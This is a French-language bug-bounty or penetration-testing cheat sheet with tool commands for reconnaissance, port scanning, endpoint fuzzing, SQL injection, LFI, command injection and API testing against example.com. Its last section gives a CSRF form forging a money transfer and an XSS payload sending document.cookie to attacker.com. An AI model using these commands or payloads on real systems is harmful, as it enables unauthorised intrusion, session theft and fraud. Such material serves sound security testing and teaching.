### **FICHE 1 : Reconnaissance**

#### **Objectif : Collecter des informations sur la cible.**

##### **1. Sous-domaines**

- **Subfinder** :
    
    `subfinder -d example.com -o subdomains.txt`
    
- **Assetfinder** :
    
      
    
     
    
    `assetfinder --subs-only example.com >> subdomains.txt`
    
- **Amass (Mode passif)** :
    
    `amass enum -passive -d example.com >> subdomains.txt`
    
- **Unifier et trier les résultats** :

    `sort -u subdomains.txt -o subdomains.txt`
    

##### **2. Résolution DNS**

- **MassDNS** :
    
    `massdns -r resolvers.txt -t A -o S -w resolved.txt subdomains.txt cat resolved.txt | cut -d " " -f1 > live_subdomains.txt`
    

##### **3. Scan des ports**

- **Naabu** (ports ouverts) :
    
    `naabu -iL live_subdomains.txt -o open_ports.txt`
    

##### **4. Scanner DNS**

- **DNSRecon** :
    
    `dnsrecon -d example.com`
    

---

### **FICHE 2 : Exploration des services**

#### **Objectif : Identifier les services et technologies actifs.**

##### **1. Scan réseau et bannières**

- **Nmap** (Scan standard) :

    `nmap -sC -sV -iL open_ports.txt -oN service_scan.txt`
    
- **Nmap** (Scan complet) :

    `nmap -p- -iL live_subdomains.txt -oN full_scan.txt`

##### **2. Détection des technologies web**

- **WhatWeb** :

    `whatweb http://example.com`
    
- **Wappalyzer** :

    `wappalyzer-cli example.com`
##### **3. Capture des cibles HTTP**

- **Gowitness** :

    `gowitness file -s live_subdomains.txt --threads 10`
    
---

### **FICHE 3 : Fuzzing des endpoints**

#### **Objectif : Identifier des ressources cachées ou sensibles.**

##### **1. Découverte de chemins et fichiers**

- **FFUF** :

    `ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -mc 200,301,302`
    
- **Dirsearch** (Extensions courantes) :

    `dirsearch -u http://example.com -e php,asp,aspx,jsp,txt -w /path/to/wordlist.txt`
    
##### **2. Recherche de paramètres cachés**

- **WFuzz** :
 
    `wfuzz -c -z file,/path/to/wordlist.txt -u http://example.com/page?FUZZ=value`
    
##### **3. Recherche de fichiers sensibles**

- **ParamSpider** (Récupérer des URLs avec paramètres) :

    `python3 paramspider.py -d example.com -o output.txt`
    
---

### **FICHE 4 : Tests d’applications web**

#### **Objectif : Identifier des vulnérabilités courantes.**

##### **1. SQL Injection**

- **SQLMap** :

    `sqlmap -u "http://example.com/page?id=1" --dbs sqlmap -u "http://example.com/page?id=1" --tables -D database_name`
##### **2. Cross-Site Scripting (XSS)**

- **Tests manuels** :
    
    `<script>alert('XSS')</script>`
    
- **XSStrike** (Automatisation) :

    `xsstrike http://example.com`
    
##### **3. Inclusion de fichiers (LFI)**

- **FFUF (Fuzz des chemins)** :

    `ffuf -u http://example.com/page?file=../../FUZZ -w /path/to/lfi-wordlist.txt`
    
##### **4. Command Injection**

- **Fuzzing avec WFuzz** :

    `wfuzz -c -z file,/path/to/payloads.txt -u http://example.com/command?input=FUZZ`
    
---

### **FICHE 5 : Analyse des APIs**

#### **Objectif : Découvrir des endpoints et tester les vulnérabilités des APIs.**

##### **1. Découverte d’API**

- **Documentation (Swagger)** :

    `apispecparser -u http://example.com/api-docs`
    
##### **2. Fuzzing des APIs**

- **FFUF (Endpoints)** :

    `ffuf -u http://example.com/api/v1/FUZZ -w /path/to/api-wordlist.txt`
    
##### **3. Injection GraphQL**

- **GraphQLMap** :

    `graphqlmap -u http://example.com/graphql`
    
---

### **FICHE 6 : Exploitation et PoC**

#### **Objectif : Valider les vulnérabilités.**

##### **1. Exploitation des XSS**

- **Dalfox** :
    `dalfox url http://example.com/vulnpage`

##### **2. Exploitation des failles CSRF**

- **CSRF PoC Génération** :

    `<form method="POST" action="http://example.com/transfer">     <input type="hidden" name="amount" value="1000">     <input type="submit" value="Exploit CSRF"> </form>`
    
##### **3. Proof of Concept (PoC)**

- **Exemple (XSS)** :
    `<script> fetch('https://attacker.com/steal?cookie=' + document.cookie); </script>`